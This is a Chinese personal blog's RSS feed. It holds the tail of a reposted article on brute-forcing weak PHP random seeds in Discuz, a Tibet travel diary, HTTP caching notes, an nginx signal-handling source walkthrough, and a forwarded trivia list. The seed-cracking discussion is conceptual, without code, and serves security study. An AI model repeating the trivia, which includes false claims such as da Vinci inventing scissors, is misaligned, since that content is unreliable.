<p>2) 有的人认为如果没有mt_srand((double)microtime() * 1000000);这里的定义，那么dz就<br>
不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不<br>
利用'Cross Application Attacks'，5.2.6&gt;php&gt;4.2.0 php本身默认播种的算法也不是很强<br>
悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。</p>
<p><br>
八、后话</p>
<p>&nbsp;&nbsp;&nbsp; 本文是80vul的三大马甲：80vul-A，80vul-B，80vul-C集体智慧的结晶，尤其是80vul-B贡<br>
献了不少新发现。另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就<br>
没有本文。本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇<br>
幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含<br>
了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来<br>
炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你<br>
找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！</p>
<p><br>
九、附录</p>
[1] http://bbs.phpchina.com/attachment.php?aid=22294<br>
[2] http://www.php-security.org/<br>
[3] http://bugs.php.net/bug.php?id=40114]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720105293435603/</guid>
    </item>
    <item>
      <title>
<![CDATA[西藏行，写在一周后]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720124135024598/</link>
      <description>
<![CDATA[40个小时的火车坐票、没有订旅馆、没有订旅行社、没有事先租车，算不上驴友的四人行始于此。<wbr><div><br></div><div>4月28日下午16:47，收到飘羽20分钟前发来的短信“几点到火车站”，身未动，心已行，17:30离开公司，19:00会师北京西站，随便吃了点东西，又到超市买了些路上的干粮，吐槽一下北京西站检票的，那个慢啊。。。。。。</div><div><br></div><div>28日晚，火车上还是有点兴奋的，后果就是睡不着，和两个90后一个80后聊了半天，0点左右他们睡了，然后从飘羽的包里取出一瓶酒，喝了几口有点困，又和飘羽鬼扯上了，一夜眯了大概不到2个小时。</div><div><br></div><div>29日，7点半有人在中卫下车了，13点有人在兰州下车了，16点有人在西宁下车了；缘分是件很奇怪的事，三个各有特点的路人甲乙丙，生活工作都没有交集，只是因为是在心情不平静的西藏路上才会认识，当天的景色主要是大片的荒凉，很多堂骑士的仇敌---大风车，17:40的时候，见到了活物，有人喊是藏羚羊，其实应该是藏绵羊，18:30开始下雪，小激动了一下，这可是5月啊。然后der发现同车厢里有一个师弟和一个师妹，问了下他们住的地方，感觉不错，一个电话搞定，4人间，25元/床。</div><div><br></div><div>30日，1点到格尔木，跑下车得瑟一下，拍几张照，真TMD冷。车过格尔木，大家都激动起来，透过窗户，已经可以看到远处的雪山，可惜火车的窗户太脏，车里的灯也反光，拍不好。不过我们在格尔木已经跑下车<span style="line-height: 22px;"  >擦过几次</span>窗户，再用火车的窗帘把头和相机盖住，效果还是不错的。再往里走，天苍苍、白茫茫，大雪之上牦牛羊；风景还是很不错的，过那曲16点抵拉萨，下了火车，抬头看看天，那才叫浮云，帝都的天上全是乌云。搭1路车到团结新村南门站，步行几步到吉祥宝马宾馆，电话等人接<span style="background-color: rgb(235, 243, 247); color: rgb(51, 51, 51); font-family: Tahoma, Verdana, STHeiTi, simsun, sans-serif; font-size: 12px; line-height: 16px; text-align: -webkit-auto;"  >08916786089，</span><span style="line-height: 22px;"  >住宿条件还是挺满意的，话说有人在火车站喝了红牛，到宾馆就吐了，略事休息，兵发布宫。</span></div><div><span style="line-height: 22px;"  >老板说，布宫门票要提前一天买，下午16点左右就不卖了，并推荐了一家附近的东北饺子馆，翠花饺子馆，就在宾馆去布宫的路上，</span></div><div><span style="line-height: 22px;"  ><br></span></div><div><span style="line-height: 22px;"  >1日，去布宫订2日的票，大昭寺，小昭寺，喝甜茶，罗布林卡</span></div><div><span style="line-height: 22px;"  ><br></span></div><div><span style="line-height: 22px;"  >2日，上午游布宫，下午兵发羊湖，宿日喀则</span></div><div><span style="line-height: 22px;"  ><br></span></div><div><span style="line-height: 22px;"  >3日，游白居寺，扎什伦布寺</span></div><div><span style="line-height: 22px;"  ><br></span></div><div><span style="line-height: 22px;"  >4日，基本一天都在路上，抵纳木措，宿纳木措</span></div><div><span style="line-height: 22px;"  ><br></span></div><div><span style="line-height: 22px;"  >5日，归拉萨，购牦牛肉等，宿拉萨</span></div><div><span style="line-height: 22px;"  ><br></span></div><div><span style="line-height: 22px;"  >6日，飞抵杭州，游锦里，休茶馆，食川菜</span></div><div><span style="line-height: 22px;"  ><br></span></div><div><span style="line-height: 22px;"  >7日，飞归帝都，直达公司，下午上班。</span></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720124135024598/</guid>
    </item>
    <item>
      <title>
<![CDATA[做回预测帝，挖个坑]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720108145957835/</link>
      <description>
<![CDATA[数据挖掘大有可为]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720108145957835/</guid>
    </item>
    <item>
      <title>
<![CDATA[Web请求缓存]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201081054056456/</link>
      <description>
<![CDATA[Ctrl+F5：强制清空缓存，无论是否过期，都重新从服务器取信息<br>F5：从服务器取信息，If-Modified-Since头被加上，忽视Expire，很有可能得到304返回<br>超链接：Expire和If-Modified-Since都生效，可能根本不向服务器发消息。<br><br>If-Modified-Since常与Etag换用，Apache同时支持这两种，Etag一般用文件的MD5等。<br>HTTP/1.1 200 OK<br>Date: Fri, 10 Sep 2010 09:40:46 GMT<br>Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch mod_python/3.3.1 Python/2.5.2<br>Last-Modified: Fri, 10 Sep 2010 08:35:25 GMT<br>ETag: "6c080-f3-48fe3a0cd4d40"<br>Accept-Ranges: bytes<br>Content-Length: 243<br>Connection: close<br>Content-Type: text/html]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201081054056456/</guid>
    </item>
    <item>
      <title>
<![CDATA[nginx的信号处理]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201091882446813/</link>
      <description>
<![CDATA[nginx 支持热重启，热升级。即在不停止服务的情况下完成系统的升级与运行参数修改。这些都是建立在信号机制的基础上的。<br>如果要在中断现有HTTP服务的情况下重启 nginx，执行如下命令即可。<br>kill -HUP `cat /usr/local/nginx/logs/nginx.pid`<br>如果修改了 nginx 的源代码，并重新构建并测试过了，也可以在不中断现有HTTP的服务下热升级 nginx，命令如下：<br>kill -USR2 `cat /usr/local/nginx/logs/nginx.pid`<br>这时nginx的新旧版本同时工作，如果要让旧版本程序服务完正在连接的HTTP请求后即退出，命令如下：<br>kill -WINCH `cat /usr/local/nginx/logs/nginx.pid.oldbin`<br>过一段时间后，旧进程的worker 进程全部退出了，就可以关闭旧进程的master进程了<br>kill -QUIT `cat /usr/local/nginx/logs/nginx.pid.oldbin`<br>这里升级完成。<br><br>这些都是机制的实现代码主要在os/unix/ngx_process.c 和 os/unix/ngx_process_cycle.c 中。<br><b>操作机制</b><br>根据 nginx 的运行机制，主进程在完成配置文件解析，启动工作进程等主要任务后，就会进入一个主循环<br>os/unix/ngx_process_cycle.c 的 ngx_master_process_cycle 函数的框架如下<br>ngx_master_process_cycle(ngx_cycle_t *cycle)<br>{<br>&nbsp;&nbsp;&nbsp; //...<br>&nbsp;&nbsp;&nbsp; for ( ;; ) { //循环<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //...<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sigsuspend(&amp;set);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_time_update(0, 0);//update timer<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ngx_reap) { //clear, if clean ok, set live=0, and ready to exit<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; live = ngx_reap_children(cycle);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!live &amp;&amp; (ngx_terminate || ngx_quit)) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_master_process_exit(cycle);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ngx_terminate) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_signal_worker_processes(cycle, SIGKILL);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ngx_quit) {//close process, close sockets<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_signal_worker_processes(cycle,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_signal_value(NGX_SHUTDOWN_SIGNAL));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ngx_reconfigure) {//reconfigure<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //...<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ngx_restart) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //...<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ngx_reopen) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //...<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ngx_change_binary) {<br>//...<br>这样看来结构很清晰，首先调用sigsuspend等待信号，然后等信号触发后，判断几个全局变量(ngx_restart/ngx_reopen/...)来决定要执行什么操作，基于这样的思路，nginx 的信号处理函数也基本可以猜到了，就是根据信号的种类，修改相应的全局变量。现在开始追踪信号处理函数的设置代码。<br><b>信号设置</b><br>从头开始跟踪代码，查找设置signal的地方，在 core/nginx.c 文件的 main 函数中，有一个函数调用的地方<br>int ngx_cdecl main(int argc, char * const *argv){<br>&nbsp;&nbsp;&nbsp; //...<br>&nbsp;&nbsp;&nbsp; if (ngx_init_signals(cycle-&gt;log) != NGX_OK) { //init signals<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 1;<br>&nbsp;&nbsp;&nbsp; }<br>}<br>跟踪 ngx_init_signals 函数，进入os/unix/ngx_process.c 文件。代码如下所示：<br>ngx_int_t ngx_init_signals(ngx_log_t *log)<br>{&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; ngx_signal_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *sig;<br>&nbsp;&nbsp;&nbsp; struct sigaction&nbsp;&nbsp; sa; <br>&nbsp;&nbsp;&nbsp; for (sig = signals; sig-&gt;signo != 0; sig++) {// 遍历signals数组<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_memzero(&amp;sa, sizeof(struct sigaction));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sa.sa_handler = sig-&gt;handler;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sigemptyset(&amp;sa.sa_mask);//no block<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (sigaction(sig-&gt;signo, &amp;sa, NULL) == -1) { //调用sigaction，设置信号的处理函数: signno&lt;-&gt;handler <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_log_error(NGX_LOG_EMERG, log, ngx_errno,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "sigaction(%s) failed", sig-&gt;signame);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return NGX_ERROR;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return NGX_OK;<br>}<br>代码很简单，基本不用解释，信号和信号处理函数全在signals这个变量里，这个变量也在 os/unix/ngx_process.c文件中，代码如下：<br>ngx_signal_t&nbsp; signals[] = { <br>&nbsp;&nbsp;&nbsp; { ngx_signal_value(NGX_RECONFIGURE_SIGNAL),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "SIG" ngx_value(NGX_RECONFIGURE_SIGNAL),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "reload",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_signal_handler }, &nbsp;<br>&nbsp;&nbsp;&nbsp; { ngx_signal_value(NGX_REOPEN_SIGNAL),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "SIG" ngx_value(NGX_REOPEN_SIGNAL),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "reopen",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_signal_handler }, &nbsp;<br>&nbsp;&nbsp;&nbsp; { ngx_signal_value(NGX_NOACCEPT_SIGNAL),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "SIG" ngx_value(NGX_NOACCEPT_SIGNAL),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "", <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_signal_handler }, &nbsp;<br>&nbsp;&nbsp;&nbsp; { ngx_signal_value(NGX_TERMINATE_SIGNAL),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "SIG" ngx_value(NGX_TERMINATE_SIGNAL),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "stop",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_signal_handler }, &nbsp;<br>&nbsp;&nbsp;&nbsp; { ngx_signal_value(NGX_SHUTDOWN_SIGNAL),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "SIG" ngx_value(NGX_SHUTDOWN_SIGNAL),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "quit",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_signal_handler }, &nbsp;<br>&nbsp;&nbsp;&nbsp; { ngx_signal_value(NGX_CHANGEBIN_SIGNAL),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "SIG" ngx_value(NGX_CHANGEBIN_SIGNAL),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "", <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_signal_handler }, &nbsp;<br>&nbsp;&nbsp;&nbsp; { SIGALRM, "SIGALRM", "", ngx_signal_handler }, &nbsp;<br>&nbsp;&nbsp;&nbsp; { SIGINT, "SIGINT", "", ngx_signal_handler }, &nbsp;<br>&nbsp;&nbsp;&nbsp; { SIGIO, "SIGIO", "", ngx_signal_handler }, &nbsp;<br>&nbsp;&nbsp;&nbsp; { SIGCHLD, "SIGCHLD", "", ngx_signal_handler }, &nbsp;<br>&nbsp;&nbsp;&nbsp; { SIGPIPE, "SIGPIPE, SIG_IGN", "", SIG_IGN }, &nbsp;<br>&nbsp;&nbsp;&nbsp; { 0, NULL, "", NULL }<br>};<br>这是一个ngx_signal_t类型的结构数组，先去看一下ngx_signal_t的类型定义：也在os/unix/ngx_process.c文件中：<br>typedef struct {<br>&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; signo;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //信号的编号<br>&nbsp;&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp; *signame;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //信号的字符串形式，如"SIGIO"<br>&nbsp;&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp; *name;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //信号的可读名称，如"stop"<br>&nbsp;&nbsp;&nbsp;&nbsp; void&nbsp; (*handler)(int signo);//handler, mostly ngx_signal_handler //信号处理函数<br>} ngx_signal_t;<br>现在回头去看signals中定义的信号，他们的处理函数都是ngx_signal_handler函数，进入这个函数看下就全明白了。<br>ngx_signal_handler(int signo)<br>{<br>&nbsp;&nbsp;&nbsp; for (sig = signals; sig-&gt;signo != 0; sig++) {//根据信号找到相应的数组元素<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (sig-&gt;signo == signo) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; ngx_time_update(0, 0); //update time<br>&nbsp;&nbsp;&nbsp; switch (ngx_process) {<br>&nbsp;&nbsp;&nbsp; case NGX_PROCESS_MASTER:<br>&nbsp;&nbsp;&nbsp; case NGX_PROCESS_SINGLE:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch (signo) {//信号<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case ngx_signal_value(NGX_SHUTDOWN_SIGNAL)://quit<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_quit = 1; //设置全局变量 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case ngx_signal_value(NGX_TERMINATE_SIGNAL)://terminate<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case SIGINT:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_terminate = 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case ngx_signal_value(NGX_NOACCEPT_SIGNAL)://stop accept<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_noaccept = 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; //...<br>真相大白，和我们想的一样，根据信号的类型，设置相应的全局变量！<br><b>信号名的用法</b><br>回头看下ngx_signal_t的结构，里面有个成员变量叫做name，例如 stop，这个是用来做什么的呢？<br>在命令行下执行<br>/usr/local/nginx/sbin/nginx -?<br>Options:<br>&nbsp; -?,-h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : this help<br>&nbsp; -v&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : show version and exit<br>&nbsp; -V&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : show version and configure options then exit<br>&nbsp; -t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : test configuration and exit<br>&nbsp; -s signal&nbsp;&nbsp;&nbsp;&nbsp; : send signal to a master process: stop, quit, reopen, reload<br>&nbsp; -p prefix&nbsp;&nbsp;&nbsp;&nbsp; : set prefix path (default: /usr/local/nginx/)<br>&nbsp; -c filename&nbsp;&nbsp; : set configuration file (default: conf/nginx.conf)<br>&nbsp; -g directives : set global directives out of configuration file<br><br>可以看到nginx的命令行有一个选项是 -s, 可以跟 stop quit reopen之类的选项，实现向运行的nginx发信号的功能。<br>例如通过上面的signals变量可以查到 <br>
&nbsp;&nbsp;&nbsp; { ngx_signal_value(NGX_TERMINATE_SIGNAL),<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "SIG" ngx_value(NGX_TERMINATE_SIGNAL),<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "stop",<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_signal_handler },&nbsp; <br>NGX_TERMINATE_SIGNAL对应 TERM<br>所以下面这两个命令的效果是一样的<br>kill -TERM `cat /usr/local/nginx/logs/nginx.pid`<br>/usr/local/nginx/sbin/nginx -s stop<br>第一个命令的处理过程已经跟踪完了：信号处理函数设置全局变量，master进程根据全局变量执行相应的操作。<br>那么第二个命令是怎样实现的呢？<br>继续跟踪，还是从main开始。<br>首先跟踪-s选项<br>if (ngx_get_options(argc, argv) != NGX_OK)<br>这个函数就是处理命令行选项的，进入这个函数：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 's':<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (*p) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_signal = (char *) p;<br>可以看到这里设置了ngx_signal变量，回去继续跟踪main函数<br>&nbsp;&nbsp;&nbsp; if (ngx_signal) { //cmd set signal<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return ngx_signal_process(cycle, ngx_signal);<br>&nbsp;&nbsp;&nbsp; }<br>这里进入了 ngx_signal_process函数，这个函数在 core/ngx_cycle.c中<br>ngx_signal_process(ngx_cycle_t *cycle, char *sig)<br>{<br>&nbsp;&nbsp;&nbsp; //...<br>&nbsp;&nbsp;&nbsp; return ngx_os_signal_process(cycle, sig, pid); //work: translate sig, and send to pid<br>}<br>又进入了 ngx_os_signal_process 函数，这个函数在os/unix/ngx_process.c中，又回来了！<br>ngx_os_signal_process(ngx_cycle_t *cycle, char *name, ngx_int_t pid)<br>{<br>&nbsp;&nbsp;&nbsp; ngx_signal_t&nbsp; *sig; <br>&nbsp;&nbsp;&nbsp; for (sig = signals; sig-&gt;signo != 0; sig++) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ngx_strcmp(name, sig-&gt;name) == 0) {//命令行的名子是否和信号数组的信号可读名相同？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (kill(pid, sig-&gt;signo) != -1) {//发送信号。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; return 1;<br>}<br>可以看到这里用ngx_signal_t 的name 与命令行的名子进行字符串匹配。如果相同就进行kill系统调用，发信号给运行中的 nginx 进程.<br><b>总结</b><br>多数程序都是用命令行选项的方式进行控制，apache有一个单独的apache2ctl程序进行控制，而 nginx 通过信号量来实现控制的方式是很精巧的，而且它的热重启是一个很酷的特性！]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201091882446813/</guid>
    </item>
    <item>
      <title>
<![CDATA[99.999%的人都不知道的秘密 [转]]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720095482343289/</link>
      <description>
<![CDATA[<p style="margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">1.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">看看你的拉链，如果上面有YKK三个字母，那么说明这是全球最大的拉链制造商Yoshida&nbsp;Kogyo&nbsp;Kabushibibaisha的产品。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">2.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">麦当劳40%的利润来自Happy&nbsp;Meals(what??)的销售。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">3.1996版的韦伯斯特词典有315处拼写错误。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">4.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">每天平均有12个新生儿被交给错误的父母。&nbsp;(还好我不是)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">5.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">巧克力对于狗来说是致命的，只要几盎斯就可以使一只小狗，因为心脏和神经系统受损而死亡　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">6.19世纪30年代番茄酱是作为药品来销售的。&nbsp;(那可能真的卖不出去)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">7.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">达芬奇可以一手写字，同时另一手作画。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">8.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">剪刀是达芬奇发明的。&nbsp;(啊?我爱达芬奇)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">9.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">描绘蒙娜丽莎的嘴唇花费了达芬奇10年的时间。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">10.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">二战期间颁发的奥斯卡奖座是木制的，因为当时金属是稀缺物资。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">11.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">拉斯维加斯的赌场都没有钟。　</span></p>
